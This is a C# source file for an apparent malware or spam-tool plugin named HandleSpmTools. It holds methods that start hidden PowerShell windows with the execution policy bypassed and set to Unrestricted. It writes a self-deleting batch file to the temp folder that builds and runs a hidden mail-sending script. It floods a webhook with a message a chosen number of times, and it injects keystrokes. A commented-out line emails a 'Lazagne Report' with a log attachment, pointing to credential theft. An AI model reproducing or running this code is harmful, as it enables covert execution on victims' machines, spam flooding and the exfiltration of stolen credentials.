using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Text.RegularExpressions;
using System.Timers;
using System.Windows.Forms;


namespace Plugin.Handle
{
    class HandleSpmTools
    {
        public void JustEmail(string fromEmail, string toEmail, string emailPass, string Body, string Subject, string Host, string Port)
        {
            /*


                foreach (String Email in usersList)
                {
                        using (SmtpClient smtpClient = new SmtpClient())
            {
                if (Regex.IsMatch(toEmail, @"\w+([-+.']\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*"))
                {
                    using (MailMessage messages = new MailMessage())
                    {
                        try
                        {
                            MailAddress AddressFrom = new MailAddress(fromEmail);
                            messages.From = AddressFrom;
                            MailAddress AddressTo = new MailAddress(toEmail);
                            messages.To.Add(toEmail);
                            smtpClient.Send(messages);
                        }
                        catch (Exception e)
                        {
                            // log exception and keep going
                        }
                    }
                }
            }
                }
            }
            */

            MailMessage message = new MailMessage(fromEmail, toEmail, Subject, Body); message.IsBodyHtml = true;


            SmtpClient smtp = new SmtpClient(Host, Convert.ToInt32(Port));

            smtp.EnableSsl = true;
            smtp.Credentials = new NetworkCredential(fromEmail, emailPass);
            smtp.Send(message);

            /*
            //powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('" + email + "', '" + password + "');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '" + email + "';$ReportEmail.To.Add('" + toEmail + "');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'Lazagne report in the attachments.';$ReportEmail.Attachments.Add('%logFile%');$SMTPInfo.Send($ReportEmail);
            System.Diagnostics.Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b powershell $SMTPServer = '"+Host+"';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, "+Port+");$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('" + fromEmail + "', '" + emailPass + "');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '" + fromEmail+ "';$ReportEmail.To.Add('" + toEmail + "');$ReportEmail.Subject = '"+Subject+"';$ReportEmail.Body = '"+Body+".';$SMTPInfo.Send($ReportEmail); & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            }).WaitForExit();

            */
        }
        public void sendemail(string fromEmail, string toEmail, string emailPass, string Body, string Subject, string Host, string Port)
        {
            try
            {
                System.Diagnostics.Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd",
                    Arguments = $"/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden Set-ExecutionPolicy Unrestricted & exit",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    ErrorDialog = false,
                });
                System.IO.StreamWriter file = new System.IO.StreamWriter(Path.Combine(Path.GetTempPath(), "email.bat"));
                file.WriteLine("@ECHO OFF");
                file.WriteLine("SET GmailAccount=" + fromEmail);
                file.WriteLine("SET GmailPassword=" + emailPass);
                //file.WriteLine("SET Attachment=" + filepath);
                file.WriteLine("CALL :PowerShell");
                file.WriteLine("CD /D %PowerShellDir%");
                file.WriteLine("Powershell -ExecutionPolicy Bypass -Command & '%PSScript%' '%GmailAccount%' '%GmailPassword%' '%Attachment%'");
                file.WriteLine("IF EXIST %~FN0 DEL /Q /F %~FN0");
                file.WriteLine("EXIT");
                file.WriteLine(":PowerShell");
                file.WriteLine("SET PowerShellDir=C:\\Windows\\System32\\WindowsPowerShell\\v1.0");
                file.WriteLine("SET PSScript=%temp%\\~tmpSendeMail.ps1");
                file.WriteLine("IF EXIST %PSScript% DEL /Q /F %PSScript%");
                file.WriteLine("ECHO $Username      = $args[0]>> %PSScript%");
                file.WriteLine("ECHO $EmailPassword = $args[1]>> %PSScript%");
                file.WriteLine("ECHO $Attachment    = $args[2]>> %PSScript%");
                file.WriteLine("ECHO >> %PSScript%");
                file.WriteLine("ECHO $Username    = $Username >> %PSScript%");
                file.WriteLine("ECHO $EmailTo     = " + toEmail + " >> " + "%PSScript%");
                file.WriteLine("ECHO $EmailFrom   = " + fromEmail + " >> " + "%PSScript%");
                file.WriteLine("ECHO $Subject     = " + Subject + " >> " + "%PSScript%");
                file.WriteLine("ECHO $Body        = " + Body + " >> " + "%PSScript%");
                file.WriteLine("ECHO $SMTPServer  = " + Host + " >> " + "%PSScript%");
                file.WriteLine("ECHO $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body) >> %PSScript%");
                //file.WriteLine("ECHO $Attachment  = New-Object System.Net.Mail.Attachment($Attachment) >> %PSScript%");
                //file.WriteLine("ECHO $SMTPMessage.Attachments.Add($Attachment) >> %PSScript%");
                file.WriteLine("ECHO $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, "+Port+") >> %PSScript%");
                file.WriteLine("ECHO $SMTPClient.EnableSsl = $true >> %PSScript%");
                file.WriteLine("ECHO $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $EmailPassword) >> %PSScript%");
                file.WriteLine("ECHO $SMTPClient.Send($SMTPMessage) >> %PSScript%");
                file.WriteLine("GOTO :EOF");
                string sendemail = Path.Combine(Path.GetTempPath(), "email.bat");
                System.Diagnostics.Process.Start(new ProcessStartInfo
                {
                    FileName = sendemail,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    ErrorDialog = false,
                });


            }
            catch (Exception)
            {
                //return string.Empty;
            }


        }
        internal void WStart(string webhook,string message,string times)
        {
            WebHookSender.Send(webhook, message, Convert.ToInt32(times));
        }

        internal void WStop()
        {
           
        }

        internal void CStart(string mes)
        {

            SendKeys.Send(mes);
            SendKeys.Send("{Enter}");
        }

        internal void CStop()
        {

        }

        public static void mesa(string message)
        {

            SendKeys.Send(message);
            SendKeys.Send("{Enter}");

        }

    }
    public class WebHookSender
    {
        public static void Send(string url, string message, int times)
        {
            for (int i = 0; i < times; i++)
            {
                try
                {
                    System.Net.WebClient webClient = new System.Net.WebClient();
                    NameValueCollection nameValueCollection = new NameValueCollection();
                    nameValueCollection.Add("content", message);
                    webClient.UploadValues(url, nameValueCollection);
                    Console.WriteLine("message number " + i);
                }
                catch
                {
                    Console.WriteLine("couldn't send the message number " + i);
                }
            }
        }
    }
}
